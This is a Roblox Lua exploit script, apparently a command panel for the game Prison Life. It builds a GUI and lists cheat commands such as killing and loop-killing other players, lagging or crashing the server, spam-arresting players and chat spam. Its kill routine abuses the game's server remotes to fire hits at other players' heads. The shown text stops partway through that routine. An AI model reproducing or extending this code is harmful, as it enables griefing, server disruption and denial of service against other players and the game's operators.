local Topbar = Instance.new("TextLabel")
local CmdTitle = Instance.new("TextLabel")
local Background4 = Instance.new("Frame")
local Notify6 = Instance.new("TextLabel")
local Notify5 = Instance.new("TextLabel")
local Notify4 = Instance.new("TextLabel")
local Notify3 = Instance.new("TextLabel")
local Notify2 = Instance.new("TextLabel")
local Notify1 = Instance.new("TextLabel")
local CloseBar = Instance.new("TextButton")
local TransparencyBar = Instance.new("TextButton")
local Prefix = ";"

CmdGui.Name = "CmdGui"
CmdGui.Parent = game:GetService("CoreGui")
CmdGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Background.Name = "Background"
Background.Parent = CmdGui
Background.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Background.BorderSizePixel = 0
Background.Position = UDim2.new(0.368556708, 0, 0.11490047, 0)
Background.Size = UDim2.new(0, 350, 0, 350)
Background.Active = true
Background.Draggable = true

CmdName.Name = "CmdName"
CmdName.Parent = Background
CmdName.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CmdName.BorderSizePixel = 0
CmdName.Size = UDim2.new(0, 350, 0, 25)
CmdName.Font = Enum.Font.GothamBlack
CmdName.Text = "Commands"
CmdName.TextColor3 = Color3.fromRGB(255, 255, 255)
CmdName.TextScaled = true
CmdName.TextSize = 14.000
CmdName.TextWrapped = true

FindCmd.Name = "FindCmd"
FindCmd.Parent = Background
FindCmd.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
FindCmd.BorderColor3 = Color3.fromRGB(0, 255, 0)
FindCmd.BorderSizePixel = 0
FindCmd.Position = UDim2.new(0.0714285746, 0, 0.0702347234, 0)
FindCmd.Size = UDim2.new(0, 300, 0, 20)
FindCmd.Font = Enum.Font.SourceSans
FindCmd.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
FindCmd.PlaceholderText = "Search For Command"
FindCmd.Text = ""
FindCmd.TextColor3 = Color3.fromRGB(255, 255, 255)
FindCmd.TextSize = 13.000
FindCmd.TextWrapped = true

CmdHandler.Name = "CmdHandler"
CmdHandler.Parent = Background
CmdHandler.Active = true
CmdHandler.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CmdHandler.BackgroundTransparency = 1.000
CmdHandler.BorderSizePixel = 0
CmdHandler.AutomaticCanvasSize = "Y"
CmdHandler.Position = UDim2.new(0.0714285746, 0, 0.142857149, 0)
CmdHandler.Size = UDim2.new(0, 300, 0, 290)
CmdHandler.ScrollBarThickness = 2

CmdText.Name = "CmdText"
CmdText.Parent = nil
CmdText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CmdText.BackgroundTransparency = 1.000
CmdText.BorderSizePixel = 0
CmdText.Size = UDim2.new(0, 300, 0, 25)
CmdText.Font = Enum.Font.SourceSans
CmdText.Text = "Text"
CmdText.TextColor3 = Color3.fromRGB(255, 255, 255)
CmdText.TextScaled = true
CmdText.TextSize = 14.000
CmdText.TextWrapped = true

UIListLayout.Parent = CmdHandler
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

Minimum.Name = "Minimum"
Minimum.Parent = Background
Minimum.BackgroundColor3 = Color3.fromRGB(0, 155, 155)
Minimum.BorderSizePixel = 0
Minimum.Position = UDim2.new(0.842857122, 0, 0.00571428565, 0)
Minimum.Size = UDim2.new(0, 20, 0, 20)
Minimum.Font = Enum.Font.SourceSans
Minimum.Text = ""
Minimum.TextColor3 = Color3.fromRGB(255, 255, 255)
Minimum.TextSize = 14.000
Minimum.MouseButton1Click:Connect(function()
	if Background.BackgroundTransparency == 0 then
		Background.BackgroundTransparency = 1
		Background.Size = UDim2.new(0, 350, 0, 25)
		FindCmd.Visible = false
		CmdHandler.Visible = false
	elseif Background.BackgroundTransparency == 1 then
		Background.BackgroundTransparency = 0
		Background.Size = UDim2.new(0, 350, 0, 350)
		FindCmd.Visible = true
		CmdHandler.Visible = true
	end
end)

Close.Name = "Close"
Close.Parent = Background
Close.BackgroundColor3 = Color3.fromRGB(155, 0, 0)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.928571403, 0, 0.00571428565, 0)
Close.Size = UDim2.new(0, 20, 0, 20)
Close.Font = Enum.Font.SourceSans
Close.Text = ""
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextSize = 14.000
Close.MouseButton1Click:Connect(function()
	Background.Visible = false
end)

-- New

Background2.Name = "Background"
Background2.Parent = CmdGui
Background2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Background2.BorderSizePixel = 0
Background2.Position = UDim2.new(0.012, 0, 0.807, 0)
Background2.Size = UDim2.new(0, 250, 0, 80)
Background2.Active = true
Background2.Draggable = true

Label.Name = "Label"
Label.Parent = Background2
Label.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Label.BorderSizePixel = 0
Label.Position = UDim2.new(0, 0, 0, 0)
Label.Size = UDim2.new(0, 250, 0, 25)
Label.Font = Enum.Font.GothamBlack
Label.Text = "Execute Bar"
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextScaled = true
Label.TextSize = 14.000
Label.TextWrapped = true

Execute.Name = "Execute"
Execute.Parent = Background2
Execute.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Execute.BorderColor3 = Color3.fromRGB(0, 255, 0)
Execute.Position = UDim2.new(0.097, 0, 0.436, 0)
Execute.Size = UDim2.new(0, 200, 0, 30)
Execute.Font = Enum.Font.SourceSans
Execute.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
Execute.PlaceholderText = "Press "..Prefix.." To Enter"
Execute.Text = ""
Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
Execute.TextSize = 16.000
Execute.TextWrapped = true

Background3.Name = "Background3"
Background3.Parent = CmdGui
Background3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Background3.BorderSizePixel = 0
Background3.Position = UDim2.new(0.306701034, 0, 0.288421065, 0)
Background3.Size = UDim2.new(0, 200, 0, 100)
Background3.Active = true
Background3.Visible = false

Topbar.Name = "Topbar"
Topbar.Parent = Background3
Topbar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Topbar.BorderSizePixel = 0
Topbar.Size = UDim2.new(0, 200, 0, 25)
Topbar.Font = Enum.Font.GothamBlack
Topbar.Text = ""
Topbar.TextColor3 = Color3.fromRGB(255, 255, 255)
Topbar.TextScaled = true
Topbar.TextSize = 14.000
Topbar.TextWrapped = true

CmdTitle.Name = "CmdTitle"
CmdTitle.Parent = Background3
CmdTitle.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
CmdTitle.BackgroundTransparency = 1.000
CmdTitle.BorderSizePixel = 0
CmdTitle.Position = UDim2.new(0.0500000007, 0, 0.379999995, 0)
CmdTitle.Size = UDim2.new(0, 180, 0, 40)
CmdTitle.Font = Enum.Font.GothamBlack
CmdTitle.Text = ""
CmdTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
CmdTitle.TextSize = 14.000
CmdTitle.TextWrapped = true

Background4.Name = "Background4"
Background4.Parent = CmdGui
Background4.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Background4.BorderSizePixel = 0
Background4.Position = UDim2.new(0.0154639352, 0, 0.519107938, 0)
Background4.Size = UDim2.new(0, 250, 0, 119)
Background4.Active = true
Background4.Draggable = true

Notify6.Name = "Notify6"
Notify6.Parent = Background4
Notify6.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Notify6.BackgroundTransparency = 2.000
Notify6.BorderSizePixel = 0
Notify6.Position = UDim2.new(0, 0, -0.00512820482, 0)
Notify6.Size = UDim2.new(0, 250, 0, 20)
Notify6.Font = Enum.Font.GothamBlack
Notify6.Text = ""
Notify6.TextColor3 = Color3.fromRGB(255, 255, 255)
Notify6.TextScaled = true
Notify6.TextSize = 14.000
Notify6.TextWrapped = true

Notify5.Name = "Notify5"
Notify5.Parent = Background4
Notify5.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Notify5.BackgroundTransparency = 1.000
Notify5.BorderSizePixel = 0
Notify5.Position = UDim2.new(0, 0, 0.162939027, 0)
Notify5.Size = UDim2.new(0, 250, 0, 20)
Notify5.Font = Enum.Font.GothamBlack
Notify5.Text = ""
Notify5.TextColor3 = Color3.fromRGB(255, 255, 255)
Notify5.TextScaled = true
Notify5.TextSize = 14.000
Notify5.TextWrapped = true

Notify4.Name = "Notify4"
Notify4.Parent = Background4
Notify4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Notify4.BackgroundTransparency = 1.000
Notify4.BorderSizePixel = 0
Notify4.Position = UDim2.new(0, 0, 0.331006259, 0)
Notify4.Size = UDim2.new(0, 250, 0, 20)
Notify4.Font = Enum.Font.GothamBlack
Notify4.Text = ""
Notify4.TextColor3 = Color3.fromRGB(255, 255, 255)
Notify4.TextScaled = true
Notify4.TextSize = 14.000
Notify4.TextWrapped = true

Notify3.Name = "Notify3"
Notify3.Parent = Background4
Notify3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Notify3.BackgroundTransparency = 1.000
Notify3.BorderSizePixel = 0
Notify3.Position = UDim2.new(0, 0, 0.499073505, 0)
Notify3.Size = UDim2.new(0, 250, 0, 20)
Notify3.Font = Enum.Font.GothamBlack
Notify3.Text = ""
Notify3.TextColor3 = Color3.fromRGB(255, 255, 255)
Notify3.TextScaled = true
Notify3.TextSize = 14.000
Notify3.TextWrapped = true

Notify2.Name = "Notify2"
Notify2.Parent = Background4
Notify2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Notify2.BackgroundTransparency = 1.000
Notify2.BorderSizePixel = 0
Notify2.Position = UDim2.new(0, 0, 0.667140722, 0)
Notify2.Size = UDim2.new(0, 250, 0, 20)
Notify2.Font = Enum.Font.GothamBlack
Notify2.Text = ""
Notify2.TextColor3 = Color3.fromRGB(255, 255, 255)
Notify2.TextScaled = true
Notify2.TextSize = 14.000
Notify2.TextWrapped = true

Notify1.Name = "Notify1"
Notify1.Parent = Background4
Notify1.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Notify1.BackgroundTransparency = 1.000
Notify1.BorderSizePixel = 0
Notify1.Position = UDim2.new(0, 0, 0.835207999, 0)
Notify1.Size = UDim2.new(0, 250, 0, 20)
Notify1.Font = Enum.Font.GothamBlack
Notify1.Text = ""
Notify1.TextColor3 = Color3.fromRGB(255, 255, 255)
Notify1.TextScaled = true
Notify1.TextSize = 14.000
Notify1.TextWrapped = true

CloseBar.Name = "CloseBar"
CloseBar.Parent = Background4
CloseBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseBar.BorderSizePixel = 0
CloseBar.Position = UDim2.new(0.899999976, 0, -0.210084036, 0)
CloseBar.Size = UDim2.new(0, 25, 0, 25)
CloseBar.Font = Enum.Font.GothamBlack
CloseBar.Text = "X"
CloseBar.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBar.TextScaled = true
CloseBar.TextSize = 14.000
CloseBar.TextWrapped = true
CloseBar.MouseButton1Click:Connect(function()
	Background4.Visible = false
end)

TransparencyBar.Name = "TransparencyBar"
TransparencyBar.Parent = Background4
TransparencyBar.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
TransparencyBar.BorderSizePixel = 0
TransparencyBar.Position = UDim2.new(0.799999952, 0, -0.210084036, 0)
TransparencyBar.Size = UDim2.new(0, 25, 0, 25)
TransparencyBar.Font = Enum.Font.GothamBlack
TransparencyBar.Text = "="
TransparencyBar.TextColor3 = Color3.fromRGB(255, 255, 255)
TransparencyBar.TextScaled = true
TransparencyBar.TextSize = 14.000
TransparencyBar.TextWrapped = true
TransparencyBar.MouseButton1Click:Connect(function()
	if TransparencyBar.Text == "=" then
		Background4.BackgroundTransparency = 0.750
		CloseBar.BackgroundTransparency = 0.750
		TransparencyBar.BackgroundTransparency = 0.750
		TransparencyBar.Text = "+"
	else
		Background4.BackgroundTransparency = 0.000
		CloseBar.BackgroundTransparency = 0.000
		TransparencyBar.BackgroundTransparency = 0.000
		TransparencyBar.Text = "="
	end
end)

local Versions = "5.0"
local Cmd = {}

Cmd[#Cmd + 1] = {Text = "versions "..Versions,Title = "Script versions"}
Cmd[#Cmd + 1] = {Text = "script by LocalPlayer#7434",Title = "Script owner"}
Cmd[#Cmd + 1] =	{Text = "cmd / cmds",Title = "Show commands bar"}
Cmd[#Cmd + 1] =	{Text = "rejoin / rj",Title = "Rejoin the game"}
Cmd[#Cmd + 1] =	{Text = "leave / leaveserver / quit",Title = "Leave the server"}
Cmd[#Cmd + 1] =	{Text = "admin / giveadmin [plr]",Title = "Give a commands to player"}
Cmd[#Cmd + 1] =	{Text = "unadmin / removeadmin [plr]",Title = "Remove a commands from player"}
Cmd[#Cmd + 1] =	{Text = "kill [plr]",Title = "Kill the player"}
Cmd[#Cmd + 1] =	{Text = "killall",Title = "Kill all players"}
Cmd[#Cmd + 1] =	{Text = "killguard / killsguard",Title = "Kill all guards"}
Cmd[#Cmd + 1] =	{Text = "killinmate / killsinmate",Title = "Kill all inmates"}
Cmd[#Cmd + 1] =	{Text = "killcriminal / killscriminal",Title = "Kill all criminals"}
Cmd[#Cmd + 1] =	{Text = "tase [plr]",Title = "Tase the player"}
Cmd[#Cmd + 1] =	{Text = "loopkill / loopkills [plr]",Title = "Loop kills player"}
Cmd[#Cmd + 1] =	{Text = "unloopkill / unloopkills [plr]",Title = "Unloop kills player"}
Cmd[#Cmd + 1] =	{Text = "loopkillall / loopkillsall",Title = "Loop kills all players"}
Cmd[#Cmd + 1] =	{Text = "loopkillguard / loopkillsguard",Title = "Loop kills all guards"}
Cmd[#Cmd + 1] =	{Text = "loopkillinmate / loopkillinmates",Title = "Loop kills all inmates"}
Cmd[#Cmd + 1] =	{Text = "loopkillcriminal / loopkillcriminals",Title = "Loop kills all criminals"}
Cmd[#Cmd + 1] =	{Text = "unloopkillall / unloopkillsall",Title = "Unloop kills all players"}
Cmd[#Cmd + 1] =	{Text = "unloopkillguard / unloopkillsguard",Title = "Unloop kills all guards"}
Cmd[#Cmd + 1] =	{Text = "unloopkillinmate / unloopkillinmates",Title = "Unloop kills all inmates"}
Cmd[#Cmd + 1] =	{Text = "unloopkillcriminal / unloopkillcriminals",Title = "Unloop kills all criminals"}
Cmd[#Cmd + 1] =	{Text = "inmate / inmates / prisoner / prisoners",Title = "Become inmate team"}
Cmd[#Cmd + 1] =	{Text = "guard / guards / cop / polices",Title = "Become guard team"}
Cmd[#Cmd + 1] =	{Text = "crim / criminals / criminal",Title = "Become criminal team"}
Cmd[#Cmd + 1] =	{Text = "neutral / neutrals",Title = "Become neutral team"}
Cmd[#Cmd + 1] =	{Text = "re / refresh",Title = "Respawn on old position"}
Cmd[#Cmd + 1] =	{Text = "res / respawn",Title = "Respawn on respawn pads"}
Cmd[#Cmd + 1] =	{Text = "goto / to [plr]",Title = "Teleports to the player"}
Cmd[#Cmd + 1] =	{Text = "bring [plr]",Title = "Teleports player to you"}
Cmd[#Cmd + 1] =	{Text = "tp / teleport [plr] [plr2]",Title = "Teleports player to another player"}
Cmd[#Cmd + 1] =	{Text = "arrest [plr] [time]",Title = "Arrest player that is a criminal"}
Cmd[#Cmd + 1] =	{Text = "arrestall / arrestothers",Title = "Arrest all criminals"}
Cmd[#Cmd + 1] =	{Text = "spamarrest / looparrest [plr]",Title = "Spam arrest player & lag player and server"}
Cmd[#Cmd + 1] =	{Text = "unspamarrest / unlooparrest [plr]",Title = "Stop spam arrest player"}
Cmd[#Cmd + 1] =	{Text = "clearloopkill / clearloopkills",Title = "clear all loop kills table"}
Cmd[#Cmd + 1] =	{Text = "auto / autore / autorefresh",Title = "Auto respawn on old position when died"}
Cmd[#Cmd + 1] =	{Text = "unauto / unautore / unautorefresh",Title = "Stop auto respawn on old position when died"}
Cmd[#Cmd + 1] =	{Text = "killaura",Title = "Activate kill aura"}
Cmd[#Cmd + 1] =	{Text = "nokillaura / unkillaura",Title = "Unactivate kill aura"}
Cmd[#Cmd + 1] = {Text = "antifling",Title = "Activate anti fling"}
Cmd[#Cmd + 1] = {Text = "unantifling",Title = "Unactivate anti fling"}
Cmd[#Cmd + 1] = {Text = "god",Title = "Become a god mode"}
Cmd[#Cmd + 1] = {Text = "ungod",Title = "Unbecome a god mode"}
Cmd[#Cmd + 1] =	{Text = "view / spectate / watch [plr]",Title = "Spectates the player"}
Cmd[#Cmd + 1] =	{Text = "unview / unspectate / stopwatch",Title = "Unspectates the player"}
Cmd[#Cmd + 1] =	{Text = "fastpunch / speedpunchh",Title = "Activate fast punch"}
Cmd[#Cmd + 1] =	{Text = "slowpunch / nofastpunch / normalspeedpunch",Title = "unactivate fast punch"}
Cmd[#Cmd + 1] =	{Text = "superpunch / onepunch",Title = "Activate super punch"}
Cmd[#Cmd + 1] =	{Text = "nosuperpunch / normalpunch",Title = "Unactivate super punch"}
Cmd[#Cmd + 1] =	{Text = "prefix / newprefix / changeprefix [prefix text]",Title = "Changes prefix"}
Cmd[#Cmd + 1] =	{Text = "red",Title = "Changes name tag color to red color"}
Cmd[#Cmd + 1] = {Text = "antilag / boostfps",Title = "Boost a little fps"}
Cmd[#Cmd + 1] = {Text = "unantilag",Title = "Stop boost the fps"}
Cmd[#Cmd + 1] = {Text = "noclip / noclips",Title = "Activate no clips"}
Cmd[#Cmd + 1] = {Text = "clip / clips",Title = "Unactivate no clips"}
Cmd[#Cmd + 1] =	{Text = "orange",Title = "Changes name tag color to orange color"}
Cmd[#Cmd + 1] =	{Text = "blue",Title = "Changes name tag color to blue color"}
Cmd[#Cmd + 1] =	{Text = "black",Title = "Changes name tag color to black color"}
Cmd[#Cmd + 1] =	{Text = "purple",Title = "Changes name tag color to purple color"}
Cmd[#Cmd + 1] =	{Text = "brown",Title = "Changes name tag color to brown color"}
Cmd[#Cmd + 1] =	{Text = "white",Title = "Changes name tag color to white color"}
Cmd[#Cmd + 1] =	{Text = "pink",Title = "Changes name tag color to pink color"}
Cmd[#Cmd + 1] =	{Text = "grey",Title = "Changes name tag color to grey color"}
Cmd[#Cmd + 1] =	{Text = "green",Title = "Changes name tag color to green color"}
Cmd[#Cmd + 1] =	{Text = "yellow",Title = "Changes name tag color to yellow color"}
Cmd[#Cmd + 1] =	{Text = "getpos",Title = "Prints positions"}
Cmd[#Cmd + 1] =	{Text = "unload / destroygui",Title = "Unload the scripts"}
Cmd[#Cmd + 1] =	{Text = "reload / update",Title = "Reload the script to new version"}
Cmd[#Cmd + 1] =	{Text = "How to open console?",Title = "To open console chat /console or press F9 or Fn + F9"}
Cmd[#Cmd + 1] =	{Text = "lagserver / disconnect",Title = "Lag server and disconnect after 5 minutes of lagging"}
Cmd[#Cmd + 1] =	{Text = "unlagserver / undisconnect",Title = "Stop lag server"}
Cmd[#Cmd + 1] =	{Text = "speed / setspeed / walkspeed [count]",Title = "Changes walk speeds"}
Cmd[#Cmd + 1] =	{Text = "jumppower / setjumppower [count]",Title = "Changes jump powers"}
Cmd[#Cmd + 1] =	{Text = "hipheight / sethipheight [count]",Title = "Changes hip heights"}
Cmd[#Cmd + 1] =	{Text = "gravity / setgravity [count]",Title = "Changes gravity"}
Cmd[#Cmd + 1] =	{Text = "resetspeed / resetwalkspeed",Title = "Reset walk speeds"}
Cmd[#Cmd + 1] =	{Text = "resetjumppower / rejumppower",Title = "Reset jump powers"}
Cmd[#Cmd + 1] =	{Text = "resethipheight / rehipheight",Title = "Reset hip heights"}
Cmd[#Cmd + 1] =	{Text = "resetgravity / regravity",Title = "Reset gravity"}
Cmd[#Cmd + 1] =	{Text = "makecrim [plr]",Title = "Make the player become a criminal"}
Cmd[#Cmd + 1] =	{Text = "makecrimall",Title = "Make all players become a criminals"}
Cmd[#Cmd + 1] =	{Text = "loopbring [plr]",Title = "Loop bring player"}
Cmd[#Cmd + 1] =	{Text = "unloopbring ",Title = "Unloop bring player"}
Cmd[#Cmd + 1] =	{Text = "baseballbat / bat",Title = "Gets bat"}
Cmd[#Cmd + 1] =	{Text = "superknife",Title = "Gets super knife"}
Cmd[#Cmd + 1] =	{Text = "firespeed / setfirespeed [count]",Title = "Changes fire speed for the gun"}
Cmd[#Cmd + 1] =	{Text = "autofire",Title = "Changes gun ststes to auto fire"}
Cmd[#Cmd + 1] =	{Text = "semifire",Title = "Changes gun ststes to semi fire"}
Cmd[#Cmd + 1] =	{Text = "burst / burstbullets / bullets [count]",Title = "Changes a bullets for the gun will come out when shot"}
Cmd[#Cmd + 1] =	{Text = "reloadtime / reloadtimes [count]",Title = "Changes reload times for the gun"}
Cmd[#Cmd + 1] =	{Text = "gun / guns / allguns",Title = "Obtains all guns"}
Cmd[#Cmd + 1] =	{Text = "autogun / autoguns / autoallguns",Title = "Activate auto gun when respawned"}
Cmd[#Cmd + 1] =	{Text = "unautogun / unautoguns / unautoallguns",Title = "Unactivate auto gun when respawned"}
Cmd[#Cmd + 1] =	{Text = "taserbypass / antitaser / lock",Title = "Bypass taser when got tased"}
Cmd[#Cmd + 1] =	{Text = "untaserbypass / notaserbypass / unlock",Title = "Unbypass taser when got tased"}
Cmd[#Cmd + 1] =	{Text = "nodoors / deletedoors",Title = "Deletes all doors"}
Cmd[#Cmd + 1] =	{Text = "restoredoors / doors",Title = "Restores all doors"}
Cmd[#Cmd + 1] =	{Text = "nowalls / deletewalls - delete walls",Title = "Deletes all walls"}
Cmd[#Cmd + 1] =	{Text = "walls / restorewalls - restore walls",Title = "Restore all walls"}
Cmd[#Cmd + 1] =	{Text = "anticrash / antivest",Title = "Anti crash when someone spamming armor"}
Cmd[#Cmd + 1] =	{Text = "unanticrash / unantivest",Title = "Unanti crash when someone spamming armor"}
Cmd[#Cmd + 1] =	{Text = "antishield / noshield",Title = "Anti shield users"}
Cmd[#Cmd + 1] =	{Text = "unantishield",Title = "Unanti shield users"}
Cmd[#Cmd + 1] =	{Text = "gatetower",Title = "Teleports to the gate tower"}
Cmd[#Cmd + 1] =	{Text = "tower",Title = "Teleports to the yard tower"}
Cmd[#Cmd + 1] =	{Text = "sewer",Title = "Teleports to the sewer"}
Cmd[#Cmd + 1] = {Text = "yard",Title = "Teleports to yard"}
Cmd[#Cmd + 1] =	{Text = "backnexus",Title = "Teleports to the back nexus"}
Cmd[#Cmd + 1] =	{Text = "nexus",Title = "Teleports to the nexus"}
Cmd[#Cmd + 1] =	{Text = "gate",Title = "Teleports to the gate"}
Cmd[#Cmd + 1] = {Text = "findowner / checkscriptowner",Title = "Find a script owner in the server"}
Cmd[#Cmd + 1] = {Text = "getplayer / getplayers",Title = "Get a players counts in the server"}
Cmd[#Cmd + 1] = {Text = "rapidfire",Title = "Activate rapid fire"}
Cmd[#Cmd + 1] = {Text = "autorapidfire",Title = "Auto activate rapid fire"}
Cmd[#Cmd + 1] = {Text = "unautorapidfire",Title = "Unauto activate rapid fire"}
Cmd[#Cmd + 1] =	{Text = "armory",Title = "Teleports to the armory"}
Cmd[#Cmd + 1] =	{Text = "cafe - teleport to cafe",Title = "Teleports to the cafeteria"}
Cmd[#Cmd + 1] =	{Text = "crimbase / criminalbase",Title = "Teleports to the criminals base"}
Cmd[#Cmd + 1] =	{Text = "lunchroom",Title = "Teleports to the cafeteria room"}
Cmd[#Cmd + 1] =	{Text = "spamchat [delay]",Title = "Spam the chat"}
Cmd[#Cmd + 1] =	{Text = "unspamchat",Title = "Unspam the chat"}
Cmd[#Cmd + 1] =	{Text = "savepos / saveposition",Title = "Saves positions"}
Cmd[#Cmd + 1] =	{Text = "loadpos / loadposition",Title = "Loads positions"}
Cmd[#Cmd + 1] =	{Text = "notify",Title = "Send a message when player leave / join"}
Cmd[#Cmd + 1] =	{Text = "nonotify",Title = "Stop send a message when player leave / join"}
Cmd[#Cmd + 1] =	{Text = "copychat",Title = "Copies all players chats"}
Cmd[#Cmd + 1] =	{Text = "uncopychat",Title = "uncopies all players chats"}
Cmd[#Cmd + 1] =	{Text = "chatnotify",Title = "Chats when player leave / join"}
Cmd[#Cmd + 1] =	{Text = "unchatnotify / nochatnotify",Title = "Stop chat when player leave / join"}
Cmd[#Cmd + 1] =	{Text = "opengate",Title = "Open the gate"}
Cmd[#Cmd + 1] =	{Text = "antifell / antivoid",Title = "Activate anti fell to the void when respawn as custom team"}
Cmd[#Cmd + 1] =	{Text = "unantifell / unantivoid",Title = "Unactivate anti fell to the void when respawn as custom team"}
Cmd[#Cmd + 1] =	{Text = "beam [plr]",Title = "Shoot a beam to player"}
Cmd[#Cmd + 1] =	{Text = "lagbeam / beam2 [plr]",Title = "Shoot a beam to player but lag"}
Cmd[#Cmd + 1] =	{Text = "crash / beam3 [plr]",Title = "Shoot a beam to player but even more lag"}
Cmd[#Cmd + 1] = {Text = "antispamarrest",Title = "Activate anti spam arrest"}
Cmd[#Cmd + 1] = {Text = "unantispamarrest",Title = "Unactivate anti spam arrest"}
Cmd[#Cmd + 1] =	{Text = "!getprefix",Title = "If you for get prefix you can type this in chat"}

local Mouse = game.Players.LocalPlayer:GetMouse()

for i = 1,#Cmd do
	local clone = CmdText:Clone()
	clone.Text = Cmd[i].Text
	clone.Name = "COMMANDS"
	local Ins = Instance.new("StringValue", clone)
	Ins.Name = "Title"
	Ins.Value = Cmd[i].Title
	local Ins2 = Instance.new("StringValue", clone)
	Ins2.Name = "TopbarName"
	Ins2.Value = Cmd[i].Text:split(" ")[1]
	clone.Parent = CmdHandler
	clone.MouseButton1Click:Connect(function()
		Execute:CaptureFocus()
		Execute.Text = clone.Text:split(" ")[1]
		Execute.CursorPosition = #Execute.Text + 1
	end)
end

Mouse.Move:Connect(function()
	local Guis = game:GetService("CoreGui"):GetGuiObjectsAtPosition(Mouse.X, Mouse.Y)
	local Gui
	for i,v in pairs(Guis) do
		if v.Parent == CmdHandler then
			Gui = v
		end
	end
	if Gui ~= nil then
		local PositionX
		local PositionY
		local X = Mouse.X
		local Y = Mouse.Y
		if Mouse.X > 200 then
			PositionX = Mouse.X - 201
		else
			PositionX = Mouse.X + 21
		end
		if Mouse.Y > (Mouse.ViewSizeY-96) then
			PositionY = Mouse.Y - 97
		else
			PositionY = Mouse.Y
		end
		Background3.Visible = true
		Background3.Position = UDim2.new(0, PositionX, 0, PositionY)
		Topbar.Text = Gui.TopbarName.Value
		CmdTitle.Text = Gui.Title.Value
	else
		Background3.Visible = false
	end
end)

if DisableScript then
	DisableScript()
end

local Slient = false
local ScriptDisabled = false
local LoopBeam = {}
local LoopKill = {}
local LoopTase = {}
local Admin = {}
local Watching = nil
local States = {}
local BuyGamepass = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(tonumber((game:GetService("Players").LocalPlayer.CharacterAppearance):split('=')[#((game:GetService("Players").LocalPlayer.CharacterAppearance):split('='))]), 96651)

local function GetPlayer(String)
	if not String then return end
	local Yes = {}
	for _, Player in ipairs(game.Players:GetPlayers()) do
		if string.lower(Player.Name):match(string.lower(String)) or string.lower(Player.DisplayName):match(string.lower(String)) then
			table.insert(Yes, Player)
		end
	end
	if #Yes > 0 then
		return Yes[1]
	elseif #Yes < 1 then
		return nil
	end
end

local function GetPos()
	return game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
end

local function GetCamPos()
	return workspace.CurrentCamera.CFrame
end

local function GetTeam()
	return game.Players.LocalPlayer.TeamColor.Name
end

function Goto(Player, Distance)
	local Distance = Distance or CFrame.new(0, 0, 0)
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * Distance
end

function Split(Arguaments, Split)
	if not Arguaments or not Split then return end
	return Arguaments:split(Split)
end

function ChatNotify(Message, Colors, Size)
	game.StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = Message,
		Color = Colors or Color3.fromRGB(255, 255, 255),
		Font = Enum.Font.SourceSans,
		FontSize = Size or Enum.FontSize.Size48
	})
end

function Chat(Message, Whisper)
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, Whisper or "ALl")
end

function WaitForChild(Time, Parent, Child)
	if not Parent or not Child then return end
	if Parent == "LocalPlayer" then Parent = game.Players.LocalPlayer end
	if Parent == "Character" then Parent = game.Players.LocalPlayer.Character end
	if Parent == "Backpack" then Parent = game.Players.LocalPlayer.Character.Backpack end
	local Times = Time * 10 or 1
	repeat wait(.1)
		Time = Time - 1
	until Parent:FindFirstChild(Child) or Time <= 0
	if Parent and Parent:FindFirstChild(Child) then
		return Parent:FindFirstChild(Child)
	else
		return nil
	end
end

function Kill(Player)
	pcall(function()
		if Player.Character:FindFirstChild("ForceField") or not workspace:FindFirstChild(Player.Name) or not workspace:FindFirstChild(Player.Name):FindFirstChild("Head") or Player == nil or Player.Character.Parent ~= workspace then return end
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

		local MyTeam = GetTeam()
		if Player.TeamColor.Name == game.Players.LocalPlayer.TeamColor.Name then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.random().Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
		end

		local Gun = game.Players.LocalPlayer.Character:FindFirstChild("Remington 870") or game.Players.LocalPlayer.Backpack:FindFirstChild("Remington 870")

		local FireEvent = {
			[1] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
				["Distance"] = 0, 
				["Cframe"] = CFrame.new(), 
				["Hit"] = workspace[Player.Name].Head
			}, [2] = {
				["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
				["Distance"] = 0, 
				["Cframe"] = CFrame.new(), 
				["Hit"] = workspace[Player.Name].Head
			}, [3] = {
